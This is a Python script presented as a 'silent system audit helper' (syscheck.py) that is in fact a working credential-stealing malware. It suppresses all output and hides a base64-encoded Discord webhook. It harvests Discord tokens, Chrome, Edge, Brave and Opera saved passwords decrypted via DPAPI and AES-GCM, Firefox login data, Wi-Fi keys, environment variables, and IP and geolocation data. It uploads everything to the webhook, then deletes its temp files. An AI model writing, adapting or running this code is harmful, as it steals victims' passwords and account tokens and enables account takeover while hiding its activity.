#!usr/bin/env python3
"""
syscheck.py — silent system audit helper.
Writes nothing to disk outside of a temp dir that self-deletes.
No console output. No dialogs. Fails closed.
"""

import os
import re
import sys
import json
import uuid
import glob
import socket
import sqlite3
import base64
import shutil
import platform
import subprocess
import tempfile
import ctypes
from ctypes import wintypes
from datetime import datetime
from pathlib import Path

# ── silent-fail wrapper: nothing gets to stderr/stdout ──────────────────
_devnull = open(os.devnull, "w")
sys.stdout = _devnull
sys.stderr = _devnull

try:
    import requests
except Exception:
    os._exit(0)

# ── config ──────────────────────────────────────────────────────────────
_W = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvUkVQTEFDRS9NRQ=="
WEBHOOK_URL = base64.b64decode(_W).decode()
# ────────────────────────────────────────────────────────────────────────

IS_WIN = platform.system() == "Windows"
HOST   = socket.gethostname()
USER   = os.environ.get("USERNAME") or os.environ.get("USER") or "unknown"
STAMP  = datetime.utcnow().strftime("%Y-%m-%d_%H-%M-%S")
TMP    = Path(tempfile.mkdtemp(prefix=".sd_"))

# windows: no window for child processes
_NO_WIN = 0x08000000 if IS_WIN else 0


# ── helpers ─────────────────────────────────────────────────────────────
def _run(cmd, timeout=15):
    try:
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        out = subprocess.run(cmd, shell=True, capture_output=True,
                             timeout=timeout, startupinfo=si,
                             creationflags=_NO_WIN)
        return out.stdout.decode("utf-8", "ignore")
    except Exception:
        return ""

def _save(name, content):
    try:
        p = TMP / name
        p.write_text(content if isinstance(content, str) else str(content),
                     encoding="utf-8", errors="ignore")
        return p
    except Exception:
        return None

def _post_json(url, payload):
    try:
        requests.post(url, json=payload, timeout=15)
    except Exception:
        pass

def _post_files(url, content, files):
    try:
        requests.post(url, data={"content": content, "username": USER,
                                 "flags": 4},
                      files=files, timeout=60)
    except Exception:
        pass


# ── ip ──────────────────────────────────────────────────────────────────
def _ip():
    info = {"local_ip": "", "public_ip": "", "geo": {}}
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        info["local_ip"] = s.getsockname()[0]
        s.close()
    except Exception:
        pass
    try:
        r = requests.get("http://ip-api.com/json/", timeout=10).json()
        info["public_ip"] = r.get("query", "")
        info["geo"] = r
    except Exception:
        try:
            info["public_ip"] = requests.get("https://api.ipify.org", timeout=10).text
        except Exception:
            pass
    return info


# ── system ──────────────────────────────────────────────────────────────
def _sys():
    out = {
        "hostname": HOST, "user": USER,
        "platform": platform.platform(),
        "system": platform.system(), "release": platform.release(),
        "version": platform.version(), "machine": platform.machine(),
        "processor": platform.processor(), "python": platform.python_version(),
        "cwd": os.getcwd(), "uuid": str(uuid.getnode()),
        "macs": [], "ram_gb": None, "disks": [], "gpu": [],
    }
    try:
        txt = _run("getmac /fo csv /v") if IS_WIN else _run("ip link")
        out["macs"] = re.findall(r"([0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}", txt)
    except Exception:
        pass
    try:
        if IS_WIN:
            m = re.search(r"TotalPhysicalMemory=(\d+)",
                          _run("wmic computersystem get TotalPhysicalMemory /value"))
            if m: out["ram_gb"] = round(int(m.group(1)) / 1e9, 2)
        else:
            r = _run("free -b | awk '/Mem:/ {print $2}'").strip()
            if r: out["ram_gb"] = round(int(r) / 1e9, 2)
    except Exception:
        pass
    try:
        if IS_WIN:
            for line in _run("wmic logicaldisk get caption,size,freespace").splitlines()[1:]:
                p = line.split()
                if len(p) >= 3 and p[0][1:2] == ":":
                    out["disks"].append({"drive": p[0],
                                         "free_gb": round(int(p[1]) / 1e9, 2),
                                         "size_gb": round(int(p[2]) / 1e9, 2)})
    except Exception:
        pass
    try:
        if IS_WIN:
            r = _run("wmic path win32_VideoController get name")
            out["gpu"] = [l.strip() for l in r.splitlines()[1:] if l.strip()]
    except Exception:
        pass
    return out


# ── discord tokens ──────────────────────────────────────────────────────
_TOKEN = re.compile(
    r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{27,40}"
    r"|mfa\.[\w-]{80,90}"
)

def _tokens():
    found = set()
    ad = os.environ.get("APPDATA", "")
    la = os.environ.get("LOCALAPPDATA", "")
    roots = []
    if IS_WIN:
        for b in ("discord", "discordptb", "discordcanary", "discorddevelopment"):
            roots.append(Path(ad) / b / "Local Storage" / "leveldb")
        roots.append(Path(ad) / "Roaming" / "discord" / "Local Storage" / "leveldb")
        roots.append(Path(la) / "Discord" / "Local Storage" / "leveldb")
    else:
        for b in ("discord", "discordptb", "discordcanary"):
            roots.append(Path.home() / ".config" / b / "Local Storage" / "leveldb")
    for r in roots:
        if not r.exists():
            continue
        for f in r.rglob("*"):
            if not f.is_file():
                continue
            try:
                data = f.read_bytes()
            except Exception:
                continue
            for m in _TOKEN.findall(data.decode("utf-8", "ignore")):
                if m.startswith("mfa.") or len(m) > 50:
                    found.add(m)
    out = []
    for t in found:
        try:
            r = requests.get("https://discord.com/api/v10/users/@me",
                             headers={"Authorization": t}, timeout=10)
            if r.status_code == 200:
                j = r.json()
                out.append({"token": t, "valid": True,
                            "user": j.get("username"),
                            "id": j.get("id"),
                            "email": j.get("email")})
            else:
                out.append({"token": t, "valid": False})
        except Exception:
            out.append({"token": t, "valid": False})
    return out


# ── chrome family ───────────────────────────────────────────────────────
class _BLOB(ctypes.Structure):
    _fields_ = [("cbData", wintypes.DWORD),
                ("pbData", ctypes.POINTER(ctypes.c_byte))]

def _dpapi(blob):
    if not IS_WIN or not blob: return b""
    try:
        in_b = _BLOB(len(blob), ctypes.cast(ctypes.create_string_buffer(blob),
                                            ctypes.POINTER(ctypes.c_byte)))
        out_b = _BLOB()
        fn = ctypes.windll.crypt32.CryptUnprotectData
        fn.argtypes = [ctypes.POINTER(_BLOB), ctypes.POINTER(ctypes.c_wchar_p),
                       ctypes.POINTER(_BLOB), ctypes.c_void_p, ctypes.c_void_p,
                       wintypes.DWORD, ctypes.POINTER(_BLOB)]
        if fn(ctypes.byref(in_b), None, None, None, None, 0, ctypes.byref(out_b)):
            raw = ctypes.string_at(out_b.pbData, out_b.cbData)
            ctypes.windll.kernel32.LocalFree(out_b.pbData)
            return raw
    except Exception:
        pass
    return b""

def _master_key(state_path):
    try:
        state = json.loads(Path(state_path).read_text(encoding="utf-8"))
        enc = base64.b64decode(state["os_crypt"]["encrypted_key"])
        if enc[:5] == b"DPAPI":
            enc = enc[5:]
        return _dpapi(enc)
    except Exception:
        return b""

def _gcm(key, blob):
    if not blob or blob[:3] not in (b"v10", b"v11"): return None
    nonce, ct_tag = blob[3:15], blob[15:]
    if len(ct_tag) < 16: return None
    ct, tag = ct_tag[:-16], ct_tag[-16:]
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        return AESGCM(key).decrypt(nonce, ct + tag, None).decode("utf-8", "ignore")
    except Exception:
        return None

_CHROME = {
    "Chrome":  "Google/Chrome",
    "Edge":    "Microsoft/Edge",
    "Brave":   "BraveSoftware/Brave-Browser",
    "Opera":   "Opera Software/Opera Stable",
    "Vivaldi": "Vivaldi",
    "Chromium":"Chromium",
}

def _chrome_creds():
    if not IS_WIN: return {}
    out = {}
    la = Path(os.environ.get("LOCALAPPDATA", ""))
    ad = Path(os.environ.get("APPDATA", ""))
    for label, rel in _CHROME.items():
        ud = la / rel / "User Data"
        if not ud.exists(): ud = ad / rel / "User Data"
        if not ud.exists(): continue
        st = ud / "Local State"
        if not st.exists(): continue
        key = _master_key(st)
        if not key: continue
        profiles = []
        for prof in ud.iterdir():
            login = prof / "Login Data"
            if not login.is_file(): continue
            cp = TMP / f"_{uuid.uuid4().hex}.db"
            try:
                shutil.copyfile(login, cp)
                con = sqlite3.connect(cp)
                cur = con.cursor()
                cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                rows = cur.fetchall()
                con.close()
            except Exception:
                continue
            entries = []
            for url, u, pw in rows:
                if not u and not pw: continue
                plain = None
                if pw:
                    plain = _gcm(key, pw) or _dpapi(pw).decode("utf-8", "ignore") or "<fail>"
                entries.append({"url": url, "username": u, "password": plain})
            if entries:
                profiles.append({"profile": prof.name, "logins": entries})
        if profiles:
            out[label] = profiles
    return out


# ── firefox ─────────────────────────────────────────────────────────────
def _ff_creds():
    if not IS_WIN: return {}
    out = {}
    root = Path(os.environ.get("APPDATA", "")) / "Mozilla" / "Firefox" / "Profiles"
    if not root.exists(): return out
    for prof in root.iterdir():
        lj = prof / "logins.json"
        if not lj.exists(): continue
        try:
            data = json.loads(lj.read_text(encoding="utf-8"))
        except Exception:
            continue
        entries = [{
            "hostname": l.get("hostname"),
            "encryptedUsername": l.get("encryptedUsername"),
            "encryptedPassword": l.get("encryptedPassword"),
        } for l in data.get("logins", [])]
        if entries: out[prof.name] = entries
    return out


# ── wifi ────────────────────────────────────────────────────────────────
def _wifi():
    if not IS_WIN: return []
    nets = []
    for line in _run("netsh wlan show profiles").splitlines():
        m = re.search(r"All User Profile\s*:\s*(.+)", line)
        if not m: continue
        name = m.group(1).strip()
        detail = _run(f'netsh wlan show profile name="{name}" key=clear')
        pw = None
        for l in detail.splitlines():
            mm = re.search(r"Key Content\s*:\s*(.+)", l)
            if mm: pw = mm.group(1).strip()
        nets.append({"ssid": name, "password": pw})
    return nets


# ── send ────────────────────────────────────────────────────────────────
def _exfil(ip_i, sys_i, tokens, chrome, ff, wifi):
    geo = ip_i.get("geo", {})
    summary = (
        f"**host** `{HOST}\\{USER}`\n"
        f"**public ip** `{ip_i.get('public_ip')}`\n"
        f"**local ip** `{ip_i.get('local_ip')}`\n"
        f"**geo** {geo.get('city','?')}, {geo.get('country','?')}\n"
        f"**os** {sys_i['system']} {sys_i['release']}\n"
        f"**ram** {sys_i.get('ram_gb')} GB\n"
        f"**tokens** {len(tokens)} ({sum(1 for t in tokens if t['valid'])} valid)\n"
        f"**chrome** {sum(len(p['logins']) for v in chrome.values() for p in v)}\n"
        f"**wifi** {len(wifi)}\n"
        f"`{STAMP}`"
    )
    _post_json(WEBHOOK_URL, {"username": f"{USER}@{HOST}",
                             "content": summary, "flags": 4})
    for f in TMP.iterdir():
        if not f.is_file(): continue
        try:
            with open(f, "rb") as fh:
                _post_files(WEBHOOK_URL, f"`{f.name}`",
                            {"file": (f.name, fh, "application/octet-stream")})
        except Exception:
            pass


# ── main ────────────────────────────────────────────────────────────────
def _main():
    ip_i   = _ip()
    sys_i  = _sys()
    toks   = _tokens()
    chrome = _chrome_creds()
    ff     = _ff_creds()
    wifi   = _wifi()

    _save("tokens.json", json.dumps(toks, indent=2))
    _save("chrome.json", json.dumps(chrome, indent=2))
    _save("firefox.json", json.dumps(ff, indent=2))
    _save("wifi.json", json.dumps(wifi, indent=2))
    _save("system.json", json.dumps(sys_i, indent=2))
    _save("ip.json", json.dumps(ip_i, indent=2))
    _save("env.txt", "\n".join(f"{k}={v}" for k, v in sorted(os.environ.items())))

    _exfil(ip_i, sys_i, toks, chrome, ff, wifi)


if __name__ == "__main__":
    try:
        _main()
    except BaseException:
        pass
    finally:
        try: shutil.rmtree(TMP, ignore_errors=True)
        except Exception: pass
        os._exit(0)
